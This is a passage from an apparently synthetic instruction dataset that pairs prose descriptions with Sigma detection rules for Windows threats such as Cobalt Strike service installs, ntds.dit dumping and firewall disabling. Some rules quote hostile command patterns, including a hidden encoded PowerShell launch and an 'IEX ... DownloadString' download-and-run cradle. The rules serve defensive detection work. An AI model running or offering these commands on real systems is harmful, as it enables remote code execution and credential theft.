access, elevate their control, or avoid detection within a compromised system respectively. By ensuring that audit logs are closely monitored for such critical changes, defenders can better safeguard against these tactics, thereby reinforcing the security posture of their SQL Server environments."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential EmpireMonkey APT activity.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential EmpireMonkey APT activity, you should: Focus on monitoring the creation of processes within Windows environments. Specifically, look for occurrences where the command line execution involves the use of '/e:jscript', which indicates the specification of the execution engine, likely for malicious purposes. Additionally, pay attention to the use of '\\Local\\Temp\\Errors.bat' in the command line, as this points to a script execution that is suspect within the context of this attack pattern. The analysis should be concentrated on these combined elements in the command line execution to identify potential malicious activities. The reliability of this detection strategy is considered high with a minimal chance of false positives, indicating that when these indicators are found, they are likely indicative of an actual threat rather than benign activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '/e:jscript' # This is a guess since the report doesn't mention the method of execution. This assumes that it is achieved via specifying the execution engine\n            - '\\Local\\Temp\\Errors.bat'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '/e:jscript' # This is a guess since the report doesn't mention the method of execution. This assumes that it is achieved via specifying the execution engine\n            - '\\Local\\Temp\\Errors.bat'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "potential EmpireMonkey APT activity",
      "answer": "In order to detect potential EmpireMonkey APT activity, you should: Focus on monitoring the creation of processes within Windows environments. Specifically, look for occurrences where the command line execution involves the use of '/e:jscript', which indicates the specification of the execution engine, likely for malicious purposes. Additionally, pay attention to the use of '\\Local\\Temp\\Errors.bat' in the command line, as this points to a script execution that is suspect within the context of this attack pattern. The analysis should be concentrated on these combined elements in the command line execution to identify potential malicious activities. The reliability of this detection strategy is considered high with a minimal chance of false positives, indicating that when these indicators are found, they are likely indicative of an actual threat rather than benign activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement, you should analyze Windows system service logs with an emphasis on the following criteria:\n\n1. Focus on log entries from the Service Control Manager, specifically those with an EventID of 7045. This event ID is indicative of a service being installed on the system.\n\n2. Within these logs, search for service installation paths that exhibit suspicious characteristics, such as:\n   - Paths containing both 'ADMIN$' and '.exe', which might suggest the creation of a service to execute a remote administrative executable, a common tactic for maintaining access or executing commands with elevated privileges.\n   - Paths that include the environment variable '%COMSPEC%', alongside the keywords 'start' and 'powershell'. This pattern can indicate the execution of PowerShell commands through the command prompt (CMD), a technique often utilized for script execution or launching encoded or obfuscated attacks.\n   - Direct indications of PowerShell being used with options designed to hide the activity and possibly execute encoded commands (`powershell -nop -w hidden -encodedcommand`). This is a strong indicator of an attempt to bypass detection mechanisms by running PowerShell in a less conspicuous manner.\n   - Service paths that contain Base64 encoded command sequences, especially those indicating an attempt to execute code or scripts hosted externally (as evidenced by \"IEX (New-Object Net.Webclient).DownloadString\"). This method is often used to retrieve and execute malicious payloads from a controlled external source, typically a web server under the attacker's control.\n\n3. Any instances matching these patterns should be treated with a high level of suspicion. These patterns are indicative of methods associated with advanced persistent threats (APTs) like Cobalt Strike, focusing on stealthy elevation of privileges, lateral movement within a network, and potentially establishing persistence.\n\n4. While analyzing these logs, it's crucial to approach with an understanding that not all matches will indicate a malicious presence (as there can be unknown false positives), but due to the critical nature of these signs, each detection should be investigated thoroughly.\n\nThis approach leverages tailoring detection mechanisms towards the complexity and sophistication of tactics and techniques used in advanced cyber attacks, specifically using PowerShell and service creation for executing malicious activities, which align with tactics and techniques like Execution, Persistence, Privilege Escalation, and Lateral Movement.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection_id:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    selection1:\n        ImagePath|contains|all:\n            - 'ADMIN$'\n            - '.exe'\n    selection2:\n        ImagePath|contains|all:\n            - '%COMSPEC%'\n            - 'start'\n            - 'powershell'\n    selection3:\n        ImagePath|contains: 'powershell -nop -w hidden -encodedcommand'\n    selection4:\n        ImagePath|base64offset|contains: \"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:\"\n    condition: selection_id and (selection1 or selection2 or selection3 or selection4)\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection_id:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    selection1:\n        ImagePath|contains|all:\n            - 'ADMIN$'\n            - '.exe'\n    selection2:\n        ImagePath|contains|all:\n            - '%COMSPEC%'\n            - 'start'\n            - 'powershell'\n    selection3:\n        ImagePath|contains: 'powershell -nop -w hidden -encodedcommand'\n    selection4:\n        ImagePath|base64offset|contains: \"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:\"\n    condition: selection_id and (selection1 or selection2 or selection3 or selection4)\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement",
      "answer": "In order to detect known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement, you should analyze Windows system service logs with an emphasis on the following criteria:\n\n1. Focus on log entries from the Service Control Manager, specifically those with an EventID of 7045. This event ID is indicative of a service being installed on the system.\n\n2. Within these logs, search for service installation paths that exhibit suspicious characteristics, such as:\n   - Paths containing both 'ADMIN$' and '.exe', which might suggest the creation of a service to execute a remote administrative executable, a common tactic for maintaining access or executing commands with elevated privileges.\n   - Paths that include the environment variable '%COMSPEC%', alongside the keywords 'start' and 'powershell'. This pattern can indicate the execution of PowerShell commands through the command prompt (CMD), a technique often utilized for script execution or launching encoded or obfuscated attacks.\n   - Direct indications of PowerShell being used with options designed to hide the activity and possibly execute encoded commands (`powershell -nop -w hidden -encodedcommand`). This is a strong indicator of an attempt to bypass detection mechanisms by running PowerShell in a less conspicuous manner.\n   - Service paths that contain Base64 encoded command sequences, especially those indicating an attempt to execute code or scripts hosted externally (as evidenced by \"IEX (New-Object Net.Webclient).DownloadString\"). This method is often used to retrieve and execute malicious payloads from a controlled external source, typically a web server under the attacker's control.\n\n3. Any instances matching these patterns should be treated with a high level of suspicion. These patterns are indicative of methods associated with advanced persistent threats (APTs) like Cobalt Strike, focusing on stealthy elevation of privileges, lateral movement within a network, and potentially establishing persistence.\n\n4. While analyzing these logs, it's crucial to approach with an understanding that not all matches will indicate a malicious presence (as there can be unknown false positives), but due to the critical nature of these signs, each detection should be investigated thoroughly.\n\nThis approach leverages tailoring detection mechanisms towards the complexity and sophistication of tactics and techniques used in advanced cyber attacks, specifically using PowerShell and service creation for executing malicious activities, which align with tactics and techniques like Execution, Persistence, Privilege Escalation, and Lateral Movement."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential abuse of ntdsutil to dump ntds.dit database.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential abuse of ntdsutil to dump ntds.dit database, you should: Monitor Windows application logs for specific event IDs associated with the ESENT provider. The relevant event IDs to look out for are 216, 325, 326, and 327. Additionally, scrutinize these events for any references to 'ntds.dit'. This file is critical as it contains the Active Directory database, and its unauthorized duplication or access could indicate an ongoing attack to extract sensitive domain information. Be aware, however, that seeing these indicators may also coincide with legitimate backup operations or the creation of shadow copies, which are considered normal false positives in this context. The severity of this monitoring strategy is categorized as medium, signifying a significant level of importance in detecting and mitigating potential threats that exploit ntdsutil for malicious purposes. This detection method aligns with securing against tactics that involve Credential Access through techniques such as OS Credential Dumping.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: application\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        Provider_Name: 'ESENT'\n        EventID:\n            - 216\n            - 325\n            - 326\n            - 327\n        Data|contains: 'ntds.dit'\n    condition: selection\nfalsepositives:\n    - Legitimate backup operation/creating shadow copies\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: application\n    # warning: The 'data' field used in the detection section is the container for the event data as a whole. You may have to adapt the rule for your backend accordingly\ndetection:\n    selection:\n        Provider_Name: 'ESENT'\n        EventID:\n            - 216\n            - 325\n            - 326\n            - 327\n        Data|contains: 'ntds.dit'\n    condition: selection\nfalsepositives:\n    - Legitimate backup operation/creating shadow copies\nlevel: medium\n",
      "question": "potential abuse of ntdsutil to dump ntds.dit database",
      "answer": "In order to detect potential abuse of ntdsutil to dump ntds.dit database, you should: Monitor Windows application logs for specific event IDs associated with the ESENT provider. The relevant event IDs to look out for are 216, 325, 326, and 327. Additionally, scrutinize these events for any references to 'ntds.dit'. This file is critical as it contains the Active Directory database, and its unauthorized duplication or access could indicate an ongoing attack to extract sensitive domain information. Be aware, however, that seeing these indicators may also coincide with legitimate backup operations or the creation of shadow copies, which are considered normal false positives in this context. The severity of this monitoring strategy is categorized as medium, signifying a significant level of importance in detecting and mitigating potential threats that exploit ntdsutil for malicious purposes. This detection method aligns with securing against tactics that involve Credential Access through techniques such as OS Credential Dumping."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detection of unusual child processes by different system processes.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect unusual child processes by different system processes, you should focus on monitoring process creation logs within Windows systems. Specifically, look for instances where certain system processes such as winlogon.exe, services.exe, lsass.exe, csrss.exe, smss.exe, wininit.exe, spoolsv.exe, or searchindexer.exe are listed as parent processes. These parent processes should not typically spawn certain child processes, so their appearance is suspicious. Further examination should be done if these parent processes initiate PowerShell (powershell.exe, pwsh.exe), or Command Prompt (cmd.exe) as child processes, especially if the original filenames for PowerShell are PowerShell.EXE or pwsh.dll, and for Command Prompt are Cmd.Exe. \n\nAdditionally, you should apply a filter to exclude any command lines that contain both 'route' and 'ADD' to reduce false positives, as these might represent legitimate network configuration commands rather than malicious activity. Pay attention to user contexts that contain variations of 'AUTHORI' or 'AUTORI' in different language settings, indicating the user account under which these processes are being executed. \n\nBe aware that this analysis is highly specific and aimed at identifying high-risk behaviors indicative of malicious activity, such as attempting to leverage system processes to execute unauthorized commands or scripts. Despite this careful setup, there might still be unknown scenarios that could trigger false alarms, so human analysis and corroboration with other signs of compromise are advisable. The data points to focus on in the logs for this detection are the parent image path, the image path of the child process, the user account initiating the process, and the command line used.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\winlogon.exe'\n            - '\\services.exe'\n            - '\\lsass.exe'\n            - '\\csrss.exe'\n            - '\\smss.exe'\n            - '\\wininit.exe'\n            - '\\spoolsv.exe'\n            - '\\searchindexer.exe'\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    selection_img:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n            - 'Cmd.Exe'\n    filter:\n        CommandLine|contains|all:\n            - ' route '\n            - ' ADD '\n    condition: all of selection_* and not filter\nfields:\n    - ParentImage\n    - Image\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_parent:\n        ParentImage|endswith:\n            - '\\winlogon.exe'\n            - '\\services.exe'\n            - '\\lsass.exe'\n            - '\\csrss.exe'\n            - '\\smss.exe'\n            - '\\wininit.exe'\n            - '\\spoolsv.exe'\n            - '\\searchindexer.exe'\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    selection_img:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n            - 'Cmd.Exe'\n    filter:\n        CommandLine|contains|all:\n            - ' route '\n            - ' ADD '\n    condition: all of selection_* and not filter\nfields:\n    - ParentImage\n    - Image\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Detection of unusual child processes by different system processes",
      "answer": "In order to detect unusual child processes by different system processes, you should focus on monitoring process creation logs within Windows systems. Specifically, look for instances where certain system processes such as winlogon.exe, services.exe, lsass.exe, csrss.exe, smss.exe, wininit.exe, spoolsv.exe, or searchindexer.exe are listed as parent processes. These parent processes should not typically spawn certain child processes, so their appearance is suspicious. Further examination should be done if these parent processes initiate PowerShell (powershell.exe, pwsh.exe), or Command Prompt (cmd.exe) as child processes, especially if the original filenames for PowerShell are PowerShell.EXE or pwsh.dll, and for Command Prompt are Cmd.Exe. \n\nAdditionally, you should apply a filter to exclude any command lines that contain both 'route' and 'ADD' to reduce false positives, as these might represent legitimate network configuration commands rather than malicious activity. Pay attention to user contexts that contain variations of 'AUTHORI' or 'AUTORI' in different language settings, indicating the user account under which these processes are being executed. \n\nBe aware that this analysis is highly specific and aimed at identifying high-risk behaviors indicative of malicious activity, such as attempting to leverage system processes to execute unauthorized commands or scripts. Despite this careful setup, there might still be unknown scenarios that could trigger false alarms, so human analysis and corroboration with other signs of compromise are advisable. The data points to focus on in the logs for this detection are the parent image path, the image path of the child process, the user account initiating the process, and the command line used."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious use of 'calc.exe' with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious use of 'calc.exe' with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion, you should: monitor the process creation logs on Windows systems for instances where 'calc.exe' is being invoked. The monitoring should focus on any command line execution of 'calc.exe' regardless of the parameters involved. Additionally, look for the 'calc.exe' process being started from paths that do not include the standard directories: 'C:\\Windows\\System32\\', 'C:\\Windows\\SysWOW64\\', or 'C:\\Windows\\WinSxS\\'. The detection strategy involves capturing either the use of 'calc.exe' with any command line parameters, or the execution of 'calc.exe' from any directory that is not one of the aforementioned standard Windows directories. This approach helps in identifying scenarios where 'calc.exe' might be used in a manner inconsistent with its normal operation, potentially as a part of a proof of concept or an attempt to evade detection by leveraging less scrutinized file paths.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains: '\\calc.exe '\n    selection_2:\n        Image|endswith: '\\calc.exe'\n    filter_2:\n        Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n            - 'C:\\Windows\\WinSxS\\'\n    condition: selection_1 or ( selection_2 and not filter_2 )\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains: '\\calc.exe '\n    selection_2:\n        Image|endswith: '\\calc.exe'\n    filter_2:\n        Image|startswith:\n            - 'C:\\Windows\\System32\\'\n            - 'C:\\Windows\\SysWOW64\\'\n            - 'C:\\Windows\\WinSxS\\'\n    condition: selection_1 or ( selection_2 and not filter_2 )\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious use of 'calc.exe' with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion",
      "answer": "In order to detect suspicious use of 'calc.exe' with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion, you should: monitor the process creation logs on Windows systems for instances where 'calc.exe' is being invoked. The monitoring should focus on any command line execution of 'calc.exe' regardless of the parameters involved. Additionally, look for the 'calc.exe' process being started from paths that do not include the standard directories: 'C:\\Windows\\System32\\', 'C:\\Windows\\SysWOW64\\', or 'C:\\Windows\\WinSxS\\'. The detection strategy involves capturing either the use of 'calc.exe' with any command line parameters, or the execution of 'calc.exe' from any directory that is not one of the aforementioned standard Windows directories. This approach helps in identifying scenarios where 'calc.exe' might be used in a manner inconsistent with its normal operation, potentially as a part of a proof of concept or an attempt to evade detection by leveraging less scrutinized file paths."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting rundll32 that communicates with public IP addresses.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a rundll32 that communicates with public IP addresses, you should: Identify network connection events from Windows-based systems where the program rundll32.exe initiates connections to external IP addresses. Specifically, focus on connections initiated by rundll32.exe (ensuring the Image ends with '\\rundll32.exe' and Initiated is 'true'). However, it's important to exclude connections to a broad range of local and private IP address spaces, such as those starting with '10.', '192.168.', and '172.16.' through '172.31.', as well as connections to certain Microsoft IP ranges like '20.', '51.103.', '51.104.', and '51.105.'. Additionally, eliminate connections where the command line contains 'PcaSvc.dll,PcaPatchSdbTask', or the source hostname ends with '.internal.cloudapp.net'. Also, regard processes with a parent image of 'C:\\Windows\\System32\\svchost.exe' and a destination port of 443 differently. The detection logic should assert that an event matches the initial selection criteria but does not meet any of the listed exclusion filters. Be aware that false positives might occur, especially in cases where communications to other corporate systems use IP addresses from public address spaces. This detection strategy is set at a medium level of importance.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\rundll32.exe'\n        Initiated: 'true'\n    filter:\n        - DestinationIp|startswith:\n            - '10.'\n            - '192.168.'\n            - '172.16.'\n            - '172.17.'\n            - '172.18.'\n            - '172.19.'\n            - '172.20.'\n            - '172.21.'\n            - '172.22.'\n            - '172.23.'\n            - '172.24.'\n            - '172.25.'\n            - '172.26.'\n            - '172.27.'\n            - '172.28.'\n            - '172.29.'\n            - '172.30.'\n            - '172.31.'\n            - '127.'\n            - '20.' # Microsoft range, caused some FPs\n            - '51.103.' # Microsoft range, caused some FPs\n            - '51.104.' # Microsoft range, caused some FPs\n            - '51.105.' # Microsoft range, caused some FPs\n        - CommandLine|contains: 'PcaSvc.dll,PcaPatchSdbTask'\n        - SourceHostname|endswith: '.internal.cloudapp.net'\n    filter_update_processes:\n        ParentImage: 'C:\\Windows\\System32\\svchost.exe'\n        DestinationPort: 443\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Communication to other corporate systems that use IP addresses from public address spaces\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\rundll32.exe'\n        Initiated: 'true'\n    filter:\n        - DestinationIp|startswith:\n            - '10.'\n            - '192.168.'\n            - '172.16.'\n            - '172.17.'\n            - '172.18.'\n            - '172.19.'\n            - '172.20.'\n            - '172.21.'\n            - '172.22.'\n            - '172.23.'\n            - '172.24.'\n            - '172.25.'\n            - '172.26.'\n            - '172.27.'\n            - '172.28.'\n            - '172.29.'\n            - '172.30.'\n            - '172.31.'\n            - '127.'\n            - '20.' # Microsoft range, caused some FPs\n            - '51.103.' # Microsoft range, caused some FPs\n            - '51.104.' # Microsoft range, caused some FPs\n            - '51.105.' # Microsoft range, caused some FPs\n        - CommandLine|contains: 'PcaSvc.dll,PcaPatchSdbTask'\n        - SourceHostname|endswith: '.internal.cloudapp.net'\n    filter_update_processes:\n        ParentImage: 'C:\\Windows\\System32\\svchost.exe'\n        DestinationPort: 443\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Communication to other corporate systems that use IP addresses from public address spaces\nlevel: medium\n",
      "question": "rundll32 that communicates with public IP addresses",
      "answer": "In order to detect a rundll32 that communicates with public IP addresses, you should: Identify network connection events from Windows-based systems where the program rundll32.exe initiates connections to external IP addresses. Specifically, focus on connections initiated by rundll32.exe (ensuring the Image ends with '\\rundll32.exe' and Initiated is 'true'). However, it's important to exclude connections to a broad range of local and private IP address spaces, such as those starting with '10.', '192.168.', and '172.16.' through '172.31.', as well as connections to certain Microsoft IP ranges like '20.', '51.103.', '51.104.', and '51.105.'. Additionally, eliminate connections where the command line contains 'PcaSvc.dll,PcaPatchSdbTask', or the source hostname ends with '.internal.cloudapp.net'. Also, regard processes with a parent image of 'C:\\Windows\\System32\\svchost.exe' and a destination port of 443 differently. The detection logic should assert that an event matches the initial selection criteria but does not meet any of the listed exclusion filters. Be aware that false positives might occur, especially in cases where communications to other corporate systems use IP addresses from public address spaces. This detection strategy is set at a medium level of importance."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect set EnableFirewall to 0 to disable the Windows firewall.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect set EnableFirewall to 0 to disable the Windows firewall, you should: Monitor Windows registry settings specifically within the registry category to identify changes targeting firewall configurations. Key attention should be paid to events where the EventType is \u2018SetValue\u2019 indicating a modification to the registry value. Focus on changes made to \u2018TargetObject\u2019 paths ending with \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\\EnableFirewall and \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\EnableFirewall. These particular paths correspond to the settings controlling the Windows Firewall in both the Standard and Domain profiles. The critical detail to look for is if the value is set to 'DWORD (0x00000000)', which effectively disables the firewall. This action is a part of tactics often used to weaken a system's defenses, making it more susceptible to attacks by circumventing the firewall protection. It's important to note that some changes might be legitimate and marked as false positives, which means any detection should be investigated to confirm if it's a genuine threat or a benign action. The severity of this activity is considered medium, highlighting the potential risk while acknowledging that context is critical for accurate assessment.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith:\n            - \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\\EnableFirewall\n            - \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\EnableFirewall\n        Details: DWORD (0x00000000)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith:\n            - \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\\EnableFirewall\n            - \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\EnableFirewall\n        Details: DWORD (0x00000000)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Detect set EnableFirewall to 0 to disable the Windows firewall",
      "answer": "In order to detect set EnableFirewall to 0 to disable the Windows firewall, you should: Monitor Windows registry settings specifically within the registry category to identify changes targeting firewall configurations. Key attention should be paid to events where the EventType is \u2018SetValue\u2019 indicating a modification to the registry value. Focus on changes made to \u2018TargetObject\u2019 paths ending with \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\\EnableFirewall and \\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\\EnableFirewall. These particular paths correspond to the settings controlling the Windows Firewall in both the Standard and Domain profiles. The critical detail to look for is if the value is set to 'DWORD (0x00000000)', which effectively disables the firewall. This action is a part of tactics often used to weaken a system's defenses, making it more susceptible to attacks by circumventing the firewall protection. It's important to note that some changes might be legitimate and marked as false positives, which means any detection should be investigated to confirm if it's a genuine threat or a benign action. The severity of this activity is considered medium, highlighting the potential risk while acknowledging that context is critical for accurate assessment."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may communicate using a protocol and port paring that are typically not associated.\nFor example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries who may be communicating using a protocol and port pairing that are usually not associated, such as HTTPS over unconventional ports like 8088 or 587 instead of the standard port 443, you should focus on monitoring Windows PowerShell script activity. Specifically, you need to ensure Script Block Logging is enabled to capture PowerShell script executions. Look for instances where PowerShell scripts contain commands like `Test-NetConnection` along with parameters specifying `-ComputerName` and `-port`. These elements together might indicate attempts to test network connections to unusual ports, which could signify malicious activity based on the technique of leveraging different protocol and port combinations to evade detection or firewall rules. However, it's important to exclude scripts that are explicitly testing or using standard ports like 443 and 80 in their connection attempts, as these are typically associated with legitimate activities. This approach aims to strike a balance between identifying potential threats and reducing false positives, bearing in mind that legitimate administrative scripts could sometimes use similar patterns for valid purposes. The sensitivity of the detection is set to a medium level, acknowledging that while this method can effectively indicate suspicious behavior, it might not catch all variants of such activities and could occasionally flag benign actions as suspicious.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - Test-NetConnection\n            - '-ComputerName '\n            - '-port '\n    filter:\n        ScriptBlockText|contains:\n            - ' 443 '\n            - ' 80 '\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate administrative script\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains|all:\n            - Test-NetConnection\n            - '-ComputerName '\n            - '-port '\n    filter:\n        ScriptBlockText|contains:\n            - ' 443 '\n            - ' 80 '\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate administrative script\nlevel: medium\n",
      "question": "Adversaries may communicate using a protocol and port paring that are typically not associated.\nFor example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443.\n",
      "answer": "In order to detect adversaries who may be communicating using a protocol and port pairing that are usually not associated, such as HTTPS over unconventional ports like 8088 or 587 instead of the standard port 443, you should focus on monitoring Windows PowerShell script activity. Specifically, you need to ensure Script Block Logging is enabled to capture PowerShell script executions. Look for instances where PowerShell scripts contain commands like `Test-NetConnection` along with parameters specifying `-ComputerName` and `-port`. These elements together might indicate attempts to test network connections to unusual ports, which could signify malicious activity based on the technique of leveraging different protocol and port combinations to evade detection or firewall rules. However, it's important to exclude scripts that are explicitly testing or using standard ports like 443 and 80 in their connection attempts, as these are typically associated with legitimate activities. This approach aims to strike a balance between identifying potential threats and reducing false positives, bearing in mind that legitimate administrative scripts could sometimes use similar patterns for valid purposes. The sensitivity of the detection is set to a medium level, acknowledging that while this method can effectively indicate suspicious behavior, it might not catch all variants of such activities and could occasionally flag benign actions as suspicious."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting DNS queries to a TeamViewer domain only resolved by a TeamViewer client by an image that isn't named TeamViewer (sometimes used by threat actors for obfuscation).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect DNS queries to a TeamViewer domain only resolved by a TeamViewer client by an image that isn't named TeamViewer (sometimes used by threat actors for obfuscation), you should:\n\nMonitor DNS query logs from Windows systems for specific requests that are indicative of interaction with TeamViewer domains. These DNS requests are particularly aimed at querying 'taf.teamviewer.com' and 'udp.ping.teamviewer.com'. It's essential to scrutinize programs initiating these DNS queries to ensure they are genuinely associated with TeamViewer. If the initiating program image does not contain the name 'TeamViewer', it may signal an attempt at obfuscation by threat actors intending to disguise malicious activities. It is important to be aware of potential false positives, which can emerge from unknown binary names of TeamViewer or other legitimate programs that may also query the observed domains. This monitoring activity is of medium priority and aligns with tactics and techniques that involve the utilization of legitimate software (such as TeamViewer) by malicious actors in their operations.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: dns_query\ndetection:\n    dns_request:\n        QueryName:\n            - 'taf.teamviewer.com'\n            - 'udp.ping.teamviewer.com'\n    filter:\n        Image|contains: 'TeamViewer'\n    condition: dns_request and not filter\nfalsepositives:\n    - Unknown binary names of TeamViewer\n    - Other programs that also lookup the observed domain\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: dns_query\ndetection:\n    dns_request:\n        QueryName:\n            - 'taf.teamviewer.com'\n            - 'udp.ping.teamviewer.com'\n    filter:\n        Image|contains: 'TeamViewer'\n    condition: dns_request and not filter\nfalsepositives:\n    - Unknown binary names of TeamViewer\n    - Other programs that also lookup the observed domain\nlevel: medium\n",
      "question": "DNS queries to a TeamViewer domain only resolved by a TeamViewer client by an image that isn't named TeamViewer (sometimes used by threat actors for obfuscation)",
